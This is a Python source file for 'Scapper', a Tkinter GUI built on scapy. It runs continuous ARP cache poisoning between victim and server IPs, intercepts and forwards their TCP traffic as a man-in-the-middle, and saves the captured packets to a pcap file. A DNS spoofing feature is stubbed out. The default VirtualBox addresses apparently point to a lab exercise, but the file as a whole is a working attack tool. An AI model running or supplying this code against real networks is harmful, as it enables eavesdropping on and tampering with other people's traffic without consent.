from scapy.all import *
from Tkinter import *
import threading
import datetime
import time

def GetMacFromIp(targetip):
    arppacket= Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(op = 1, pdst = targetip)
    try:
        targetmac= srp(arppacket, timeout=2 , verbose= False, iface = "enp0s3")[0][0][1].hwsrc
        return targetmac
    except:
            print("WARNING: Host " + str(targetip) + " unreachable.");

def GeneratePacket(selfMac, serverIp, victimMac, victimIp):
    r = Ether()/ARP()
    r[Ether].src = selfMac
    r[ARP].hwsrc = selfMac
    r[ARP].psrc  = serverIp
    r[ARP].hwdst = victimMac
    r[ARP].pdst  = victimIp
    return r

class Application(Frame):
    def __init__(self, master = None):
        Frame.__init__(self, master)

        self.master = master
        self.master.title("Scapper")
        self.grid()

        # predefine threads
        self.poison_t = threading.Thread(target = self.arp_poison)
        self.poison_t.daemon = True
        self.poison_t.killed = False

        self.capture_t = threading.Thread(target = self.capture_packets)
        self.capture_t.daemon = True
        self.capture_t.killed = False
        
        # Create interface
        self.grid_columnconfigure(2, minsize = 120)
        self.arp = Button(self, text = "ARP Poisoning", command = self.startArp)
        self.arp.grid(row = 20, column = 0)

        self.stoparp = Button(self, text = "Stop poisoning", state = 'disabled', command = self.stopArp)
        self.stoparp.grid(row = 22, column = 0)

        self.dns = Button(self, text = "DNS Spoofing") # command = self.start dns
        self.dns.grid(row = 20, column = 5)

        self.uExitButton = Button(self, text = "Save pcap and exit", command = self.exit)
        self.uExitButton.grid(row = 25, column = 2)

        Label(self, text = "IP Victim:   ").grid(row = 2)
        Label(self, text = "IP Server:   ").grid(row = 6)

        Label(self, text = "IP Victims:      ").grid(row = 2, column = 4)
        Label(self, text = "Sites to spoof:  ").grid(row = 6, column = 4)
        Label(self, text = "Redirect IPs to: ").grid(row = 10, column = 4)
        Label(self, text = "DNS server:      ").grid(row = 14, column = 4)

        # Configure field victim's ip for arp attack
        self.uArpEntryIpVictim = Entry(self)
        self.uArpEntryIpVictim.insert(END, "192.168.56.101")
        #self.uArpEntryIpVictim.bind("<Key>", self.click)
        self.uArpEntryIpVictim.grid(row = 2, column = 1)

        # Configure field server ip for arp attack
        self.uArpEntryIpServer = Entry(self)
        self.uArpEntryIpServer.insert(END, "192.168.56.102")
        #self.uArpEntryIpServer.bind("<Key>", self.click)
        self.uArpEntryIpServer.grid(row = 6, column = 1)


        # Configure field victim's ip for DNS attack
        self.uDnsEntryIpVictim = Entry(self)
        self.uDnsEntryIpVictim.grid(row = 2, column = 5)

        self.uDnsEntryDomains = Entry(self)
        self.uDnsEntryDomains.grid(row = 6, column = 5)

        self.uDnsEntryIpRedirect = Entry(self)
        self.uDnsEntryIpRedirect.grid(row = 10, column = 5)

        self.uDnsEntryIpDNS = Entry(self)
        self.uDnsEntryIpDNS.grid(row = 14, column = 5)
        
        
        # Configure self
        self.interceptedPackets = []
        self.networkInterface = "enp0s3"
        self.selfMac = get_if_hwaddr(self.networkInterface)
        self.selfIp = "192.168.56.103"
        
    def startArp(self):
        self.arp['state'] = 'disabled'
        self.stoparp['state'] = 'normal'
        
        self.victimIp  = self.uArpEntryIpVictim.get()
        self.victimIp  = self.victimIp.split(',')

        self.victimMac, self.serverMac = [], []

        for index in range(0, len(self.victimIp)):
            self.victimMac.append(GetMacFromIp(self.victimIp[index]))

        self.serverIp = self.uArpEntryIpServer.get()
        self.serverIp = self.serverIp.split(',')
        for index in range(0, len(self.serverIp)):
            self.serverMac.append(GetMacFromIp(self.serverIp[index]))
        
        # start a sepparate thread for continously poisoning the targets
        self.poison_t.start()

        # start capturing thread
        self.capture_t.start()

    def stopArp(self):
        print "[ARP] Sending stop signal to threads"
        self.poison_t.killed = True
        self.capture_t.killed = True
        self.arp['state'] = 'normal'
        self.stoparp['state'] = 'disabled'
     
    def arp_poison(self):
        while True:
            for i in range(0, len(self.victimIp)):
                for j in range(0, len(self.serverIp)):
                    if self.poison_t.killed == True:
                        self.poison_t.killed = False
                        print "[ARP] Stopping poisoning thread... [1/2]"
                        raise SystemExit()
                    if self.victimIp[i] == self.serverIp[j]:
                        print "Error in Scapper/poison_t: Match between server and victim IP."
                        self.stopArp()
                        return
                    else:
                        packet = GeneratePacket(self.selfMac, self.serverIp[j], self.victimMac[i], self.victimIp[i])
                        sendp(packet, verbose = False, iface = self.networkInterface)

                        packet = GeneratePacket(self.selfMac, self.victimIp[i], self.serverMac[j], self.serverIp[j])
                        sendp(packet, verbose = False, iface = self.networkInterface)

                        print "[ARP] Poisoning ARP cache of: " + str([self.victimIp[i], self.serverIp[j]])
                    time.sleep(10)

    def interceptAndForward(self, packet):
        # define custom action for sniff
        if self.capture_t.killed == True:
            self.capture_t.killed = False
            print "[ARP] Stopping capturing thread...[2/2]"
            raise SystemExit()
        self.interceptedPackets.append(packet);
        print "[ARP] Cached 1 packet..."
        if packet[IP].dst in self.serverIp:
            packet[Ether].dst = self.serverMac[self.serverIp.index(packet[IP].dst)]
        else:
            packet[Ether].dst = self.victimMac[self.victimIp.index(packet[IP].dst)]
        packet[Ether].src = self.selfMac
        sendp(packet, verbose = False, iface = self.networkInterface)

    def TCPFilter(self, packet):
        if packet.haslayer(TCP) and packet[Ether].dst == self.selfMac and (packet[IP].dst in self.serverIp or packet[IP].dst in self.victimIp):
            return True
        return False

    def capture_packets(self):
        print "[ARP] Forwarding and saving TCP packets..."
        sniff(lfilter = self.TCPFilter, prn = self.interceptAndForward, iface = self.networkInterface)
        
    
    def exit(self):
        if len(self.interceptedPackets) > 0:
            wrpcap("packets-" + str(datetime.datetime.now()) + ".cap", self.interceptedPackets)
            print ".cap file saved."
        root.destroy()

        
root = Tk()
app = Application(master = root)
app.mainloop()
